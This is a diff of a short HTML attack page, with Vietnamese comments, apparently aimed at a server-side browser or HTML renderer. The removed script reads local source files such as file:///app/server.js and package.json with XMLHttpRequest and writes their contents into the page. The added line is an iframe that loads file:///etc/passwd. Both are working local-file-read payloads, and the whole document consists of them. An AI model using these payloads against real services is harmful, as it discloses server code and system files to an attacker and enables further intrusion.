@@ -1,24 +1,6 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        // Ép trình duyệt của Server đọc file mã nguồn cục bộ qua XMLHttpRequest
-        // Ta sẽ thử các đường dẫn phổ biến của Node.js/Python trên server
-        var files = ['file:///app/main.js', 'file:///app/server.js', 'file:///app/app.js', 'file:///app/package.json'];
-
-        files.forEach(function(file) {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', file, false); // Đọc đồng bộ
-            try {
-                xhr.send();
-                if (xhr.responseText) {
-                    document.write('<h3>Nội dung của ' + file + ':</h3>');
-                    document.write('<pre>' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre><hr>');
-                }
-            } catch(e) {
-                document.write('<p>Không đọc được ' + file + '</p>');
-            }
-        });
-    </script>
+  <iframe src="file:///etc/passwd" style="width:100%;height:800px;border:none"></iframe>
 </body>
 </html>
